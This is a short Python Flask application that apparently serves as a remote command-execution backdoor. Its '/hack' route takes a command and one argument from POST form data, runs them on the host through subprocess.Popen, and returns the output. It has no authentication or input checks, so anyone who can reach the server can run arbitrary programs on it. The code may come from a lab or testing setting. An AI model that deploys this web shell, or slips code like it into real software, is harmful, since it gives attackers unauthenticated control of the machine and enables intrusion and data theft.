from flask import Flask
from flask import request
import subprocess

app = Flask(__name__)

@app.route('/')
def home():
    return 'POST : cmd + arg'

@app.route('/hack', methods=['POST'])
def hack():
    if request.method == 'POST':
        data = request.form
        sub = subprocess.Popen([data["cmd"],data["arg"]], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, err = sub.communicate()
        sub.wait()
        return output